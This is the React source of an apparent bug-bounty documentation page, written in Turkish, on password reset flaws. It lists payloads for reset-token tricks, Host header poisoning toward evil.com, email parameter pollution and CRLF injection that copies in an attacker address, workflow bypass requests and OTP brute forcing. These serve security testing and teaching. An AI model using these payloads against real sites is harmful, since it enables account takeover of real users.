"use client"

import { motion } from "framer-motion"
import { Lock, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "token-manipulation", title: "Token Manipulation", level: 2 },
  { id: "host-header", title: "Host Header Poisoning", level: 2 },
  { id: "email-param", title: "Email Parameter Manipulation", level: 2 },
  { id: "flow-bypass", title: "Flow Bypass", level: 2 },
  { id: "otp-brute", title: "OTP Brute Force", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

export default function PasswordResetPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      <motion.article
        className="prose prose-invert max-w-none"
        initial="initial"
        animate="animate"
        variants={stagger}
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-red-400 text-sm font-medium mb-4">
            <Lock className="w-4 h-4" />
            <span>Authentication</span>
          </div>
          <h1 className="text-4xl font-bold text-foreground mb-4">Password Reset Flaws</h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            Şifre sıfırlama mekanizmalarındaki zafiyetler. Token prediction, host header poisoning,
            rate limit bypass ve account takeover teknikleri.
          </p>
        </motion.div>

        <Callout type="warning" title="Account Takeover">
          Password reset zafiyetleri doğrudan account takeover sağlar. Bug bounty&apos;de
          en değerli zafiyet türlerinden biridir.
        </Callout>

        <motion.section variants={fadeIn} id="token-manipulation" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">01</span>
            Token Manipulation
          </h2>
          <PayloadList
            title="Reset Token Payloads"
            initialShow={8}
            payloads={[
              { code: `Token = empty string → accepted?`, note: "Boş token" },
              { code: `Token = 0 or 000000`, note: "Zero token" },
              { code: `Token = null`, note: "Null token" },
              { code: `Token = 123456 (common OTP)`, note: "Default/common OTP" },
              { code: `Attacker's reset token → use for victim's account`, note: "Token reuse across accounts" },
              { code: `Expired token still works`, note: "No expiry check" },
              { code: `Token not single-use → replay attack`, note: "Token replay" },
              { code: `Token predictable: MD5(email + timestamp)`, note: "Weak token generation" },
              { code: `Token in response body (not just email)`, note: "Token leakage in API response" },
              { code: `Short numeric OTP → brute force (4-6 digits)`, note: "OTP brute force" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="host-header" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-red-500/10 text-red-400 text-sm font-mono">02</span>
            Host Header Poisoning
          </h2>
          <PayloadList
            title="Host Header Payloads"
            initialShow={6}
            payloads={[
              { code: `Host: evil.com`, note: "Reset link → evil.com/reset?token=xxx" },
              { code: `Host: target.com\\nX-Forwarded-Host: evil.com`, note: "X-Forwarded-Host" },
              { code: `Host: target.com\\nHost: evil.com`, note: "Duplicate host" },
              { code: `Host: evil.com\\nX-Forwarded-For: 127.0.0.1`, note: "Combined headers" },
              { code: `Host: target.com:@evil.com`, note: "URL authority bypass" },
              { code: `Host: evil.com%23target.com`, note: "Fragment injection" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="email-param" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-yellow-500/10 text-yellow-400 text-sm font-mono">03</span>
            Email Parameter Manipulation
          </h2>
          <PayloadList
            title="Email Payloads"
            initialShow={8}
            payloads={[
              { code: `email=victim@target.com&email=attacker@evil.com`, note: "Parameter pollution - CC attacker" },
              { code: `email=victim@target.com%0d%0aCc:attacker@evil.com`, note: "CRLF CC injection" },
              { code: `email=victim@target.com%20attacker@evil.com`, note: "Space-separated emails" },
              { code: `email=victim@target.com,attacker@evil.com`, note: "Comma-separated" },
              { code: `email=victim@target.com|attacker@evil.com`, note: "Pipe-separated" },
              { code: `email["victim@target.com","attacker@evil.com"]`, note: "JSON array" },
              { code: `email=victim@target.com%00attacker@evil.com`, note: "Null byte" },
              { code: `email=VICTIM@TARGET.COM`, note: "Case sensitivity check" },
              { code: `email= victim@target.com`, note: "Leading space" },
              { code: `email=victim@target.com `, note: "Trailing space" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="flow-bypass" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">04</span>
            Flow Bypass
          </h2>
          <PayloadList
            title="Workflow Bypass"
            initialShow={8}
            payloads={[
              { code: `Step 1: request reset → Step 2: skip verification → Step 3: set new password`, note: "Step skip" },
              { code: `POST /reset-password {"email":"victim","new_password":"hacked"}`, note: "Direct password set" },
              { code: `POST /reset-password {"token":"","new_password":"hacked"}`, note: "Empty token bypass" },
              { code: `Change email to attacker → request reset → change email back`, note: "Email swap attack" },
              { code: `Reset password → don't change → use reset token as auth token`, note: "Token as session" },
              { code: `POST /api/user/password {"old_password":"","new_password":"hacked"}`, note: "Empty old password" },
              { code: `PUT /api/user {"password":"hacked"} (mass assignment)`, note: "Direct password update" },
              { code: `Request reset for email A → use link for email B`, note: "Cross-account token use" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="otp-brute" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-orange-500/10 text-orange-400 text-sm font-mono">05</span>
            OTP Brute Force
          </h2>
          <PayloadList
            title="OTP Bypass Payloads"
            initialShow={6}
            payloads={[
              { code: `4-digit OTP: 0000-9999 (10k combinations)`, note: "4 haneli brute force" },
              { code: `6-digit OTP: 000000-999999 (1M combinations)`, note: "6 haneli - rate limit yoksa feasible" },
              { code: `Race condition: send 1000 OTP guesses simultaneously`, note: "Concurrent brute force" },
              { code: `OTP reuse: same OTP valid multiple times`, note: "OTP replay" },
              { code: `OTP leak in response headers/body`, note: "OTP leakage" },
              { code: `OTP valid for too long (> 5 minutes)`, note: "Long OTP validity" },
            ]}
          />
        </motion.section>

        <Callout type="tip" title="Test Metodolojisi">
          1. Reset token entropy ve uzunluğunu kontrol edin{"\n"}
          2. Token expiry ve single-use kontrolü yapın{"\n"}
          3. Host header poisoning deneyin{"\n"}
          4. Email parameter manipulation test edin{"\n"}
          5. Rate limit kontrol edin (OTP brute force){"\n"}
          6. Flow bypass deneyin (step skipping)
        </Callout>

        <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
          <div className="flex justify-between items-center">
            <Link
              href="/docs/auth/session"
              className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors text-sm"
            >
              <ArrowLeft className="w-4 h-4" />
              Session Management
            </Link>
            <Link
              href="/docs/auth/2fa-bypass"
              className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
            >
              2FA Bypass
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </motion.div>
      </motion.article>
    </div>
  )
}
